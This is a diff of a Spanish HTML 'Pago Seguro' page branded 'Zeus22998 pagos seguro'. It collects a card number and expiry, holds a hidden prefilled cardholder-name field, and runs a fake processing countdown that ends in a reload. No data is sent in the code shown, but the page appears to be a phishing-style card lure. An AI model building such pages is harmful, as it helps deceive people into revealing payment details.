@@ -1,76 +1,69 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verificación Segura</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago Seguro</title>
     <style>
-        /* FONDO NEGRO TOTAL PARA EVITAR ERRORES */
-        body {
-            background-color: #000000;
-            color: #ffffff;
-            font-family: sans-serif;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+        /* Estilos ultra-compatibles */
+        body { background-color: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .wrapper { background: #111; width: 320px; padding: 20px; border-radius: 15px; border: 1px solid #333; text-align: center; }
+        
+        /* La tarjeta visual */
+        .card-box { background: #001a4d; padding: 20px; border-radius: 10px; text-align: left; margin-bottom: 20px; border: 1px solid #003366; }
+        .chip-sim { width: 35px; height: 25px; background: #b8860b; border-radius: 4px; margin-bottom: 10px; }
+        .zeus-label { color: #00f2ff; font-size: 10px; font-weight: bold; margin-top: 10px; }
+        
+        /* Formulario */
+        label { display: block; text-align: left; font-size: 11px; color: #aaa; margin-top: 15px; }
+        input { width: 100%; padding: 12px; margin-top: 5px; background: #222; border: 1px solid #444; border-radius: 5px; color: #fff; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 15px; background: #0052ff; color: #fff; border: none; border-radius: 8px; font-weight: bold; margin-top: 20px; cursor: pointer; }
+        
+        #loader { display: none; }
+    </style>
+</head>
+<body>
 
-        /* CAJA PRINCIPAL CON BORDE NARANJA */
-        .box {
-            background-color: #111111;
-            width: 90%;
-            max-width: 350px;
-            padding: 25px;
-            border-radius: 15px;
-            border: 1px solid #ff9900;
-            text-align: center;
-        }
+    <div class="wrapper">
+        <div id="main-ui">
+            <div class="card-box">
+                <div class="chip-sim"></div>
+                <div style="letter-spacing: 2px;">#### #### #### ####</div>
+                <div class="zeus-label">Zeus22998 pagos seguro</div>
+            </div>
 
-        /* TARJETA VISUAL */
-        .card {
-            background: linear-gradient(135deg, #001f4d, #000000);
-            padding: 20px;
-            border-radius: 12px;
-            text-align: left;
-            margin-bottom: 20px;
-            border: 1px solid #222;
-        }
+            <form id="pay-form">
+                <label>NÚMERO DE TARJETA</label>
+                <input type="text" name="cc-number" inputmode="numeric" autocomplete="cc-number" required>
+                
+                <div style="display: flex; gap: 10px;">
+                    <input type="text" name="cc-exp-month" placeholder="MM" maxlength="2" autocomplete="cc-exp-month" required>
+                    <input type="text" name="cc-exp-year" placeholder="AA" maxlength="2" autocomplete="cc-exp-year" required>
+                </div>
 
-        .chip {
-            width: 40px;
-            height: 30px;
-            background: #ccaa00;
-            border-radius: 4px;
-            margin-bottom: 15px;
-        }
+                <input type="hidden" name="cc-name" autocomplete="cc-name" value="Antonio Corrales">
+                <button type="submit">VINCULAR TARJETA</button>
+            </form>
+        </div>
 
-        /* TEXTO PERSONALIZADO: Zeus22998 pagos seguro */
-        .zeus-text {
-            color: #00f2ff;
-            font-size: 11px;
-            font-weight: bold;
-            text-transform: uppercase;
-            margin-top: 10px;
-            letter-spacing: 1px;
-        }
+        <div id="loader">
+            <h2 id="timer" style="font-size: 50px; color: #0052ff;">3</h2>
+            <p>PROCESANDO...</p>
+        </div>
+    </div>
 
-        label {
-            display: block;
-            text-align: left;
-            font-size: 11px;
-            color: #ff9900;
-            margin-top: 15px;
-            font-weight: bold;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px;
-            margin-top: 5px;
-            background: #222;
-            border: 1px solid #333;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 16px
+    <script>
+        document.getElementById('pay-form').onsubmit = function(e) {
+            e.preventDefault();
+            document.getElementById('main-ui').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            let c = 3;
+            setInterval(() => {
+                c--;
+                document.getElementById('timer').innerText = c;
+                if(c === 0) window.location.reload();
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
